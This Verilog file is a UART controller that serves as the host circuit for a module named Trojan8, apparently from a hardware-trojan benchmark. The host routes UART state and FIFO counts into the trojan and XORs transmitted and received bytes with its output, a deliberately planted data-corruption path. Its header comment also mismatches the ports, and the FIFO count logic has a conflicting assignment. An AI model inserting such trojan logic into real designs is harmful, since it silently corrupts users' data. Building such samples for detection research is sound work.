// UART Controller Host Circuit for Trojan8  
// Interface: a[7:0], b[7:0], c[7:0], d[7:0], e[7:0], sel[2:0] -> y[15:0]
module trojan8_uart_host #(
    parameter BAUD_DIV = 868,             // Baud rate divisor (50MHz/57600)
    parameter FIFO_DEPTH = 16,            // UART FIFO depth
    parameter [87:0] UART_PATTERN = 88'h123456789ABCDEF012345  // UART data pattern
)(
    input wire clk,
    input wire rst,
    input wire uart_rx,
    input wire [7:0] tx_data,
    input wire tx_valid,
    input wire rx_ready,
    output reg uart_tx,
    output reg [7:0] rx_data,
    output reg rx_valid,
    output reg tx_ready
);

    // Trojan interface
    wire [7:0] trojan_a;
    wire [7:0] trojan_b;
    wire [7:0] trojan_c;
    wire [7:0] trojan_d;
    wire [7:0] trojan_e;
    wire [2:0] trojan_sel;
    wire [15:0] trojan_y;
    
    // UART controller components
    reg [15:0] baud_counter;
    reg [7:0] tx_fifo [0:15];         // Fixed to 16 entries
    reg [7:0] rx_fifo [0:15];         // Fixed to 16 entries
    reg [3:0] tx_head, tx_tail;
    reg [3:0] rx_head, rx_tail;
    reg [4:0] tx_count, rx_count;  // Make 5-bit to match FIFO_DEPTH comparison
    reg [87:0] uart_gen;
    reg [2:0] uart_state;
    reg [9:0] tx_shift_reg;
    reg [7:0] rx_shift_reg;
    reg [3:0] bit_counter;
    reg [2:0] rx_sync;
    
    integer p;
    
    // UART controller state machine
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            uart_gen <= UART_PATTERN;
            uart_state <= 3'h0;
            baud_counter <= 16'h0;
            tx_head <= 4'h0;
            tx_tail <= 4'h0;
            rx_head <= 4'h0;
            rx_tail <= 4'h0;
            tx_count <= 5'h0;
            rx_count <= 5'h0;
            tx_shift_reg <= 10'h0;
            rx_shift_reg <= 8'h0;
            bit_counter <= 4'h0;
            rx_sync <= 3'b111;
            uart_tx <= 1'b1;
            rx_data <= 8'h0;
            rx_valid <= 1'b0;
            tx_ready <= 1'b1;
            
            for (p = 0; p < 16; p = p + 1) begin
                tx_fifo[p] <= 8'h0;
                rx_fifo[p] <= 8'h0;
            end
        end else begin
            uart_gen <= {uart_gen[86:0], uart_gen[87]};
            rx_sync <= {rx_sync[1:0], uart_rx};
            rx_valid <= 1'b0;
            
            // Baud rate generator
            if (baud_counter >= BAUD_DIV) begin
                baud_counter <= 16'h0;
                
                case (uart_state)
                    3'h0: begin // IDLE
                        tx_ready <= (tx_count < FIFO_DEPTH);
                        if (tx_valid && tx_count < FIFO_DEPTH) begin
                            tx_fifo[tx_head] <= tx_data ^ trojan_y[7:0];
                            tx_head <= (tx_head + 1) & 4'hF;
                            tx_count <= tx_count + 1;
                        end
                        if (tx_count > 0) begin
                            tx_shift_reg <= {1'b1, tx_fifo[tx_tail], 1'b0};
                            tx_tail <= (tx_tail + 1) & 4'hF;
                            tx_count <= tx_count - 1;
                            bit_counter <= 4'hA;
                            uart_state <= 3'h1;
                        end
                        if (~rx_sync[2] && rx_sync[1]) begin
                            bit_counter <= 4'h8;
                            uart_state <= 3'h2;
                        end
                    end
                    3'h1: begin // TX_TRANSMIT
                        uart_tx <= tx_shift_reg[0];
                        tx_shift_reg <= {1'b1, tx_shift_reg[9:1]};
                        bit_counter <= bit_counter - 1;
                        if (bit_counter == 0) begin
                            uart_state <= 3'h0;
                        end
                    end
                    3'h2: begin // RX_RECEIVE
                        rx_shift_reg <= {rx_sync[2], rx_shift_reg[7:1]};
                        bit_counter <= bit_counter - 1;
                        if (bit_counter == 0) begin
                            if (rx_count < FIFO_DEPTH) begin
                                rx_fifo[rx_head] <= rx_shift_reg ^ trojan_y[7:0];
                                rx_head <= (rx_head + 1) & 4'hF;
                                rx_count <= rx_count + 1;
                            end
                            uart_state <= 3'h0;
                        end
                    end
                    default: uart_state <= 3'h0;
                endcase
            end else begin
                baud_counter <= baud_counter + 1;
            end
            
            // Output FIFO read
            if (rx_ready && rx_count > 0) begin
                rx_data <= rx_fifo[rx_tail];
                rx_tail <= (rx_tail + 1) & 4'hF;
                rx_count <= rx_count - 1;
                rx_valid <= 1'b1;
            end
        end
    end
    
    // Connect trojan inputs
    assign trojan_a = uart_gen[7:0];
    assign trojan_b = tx_data;
    assign trojan_c = rx_shift_reg;
    assign trojan_d = {3'h0, tx_count[4:0]};  // Take 5-bit and extend to 8-bit
    assign trojan_e = {3'h0, rx_count[4:0]};  // Take 5-bit and extend to 8-bit
    assign trojan_sel = uart_state;
    
    // Instantiate Trojan8
    Trojan8 #(
        .MASK_00FF(16'h0066),
        .MASK_0F(8'h09),
        .MASK_F0F0(16'h6666)
    ) trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .sel(trojan_sel),
        .y(trojan_y)
    );

endmodule
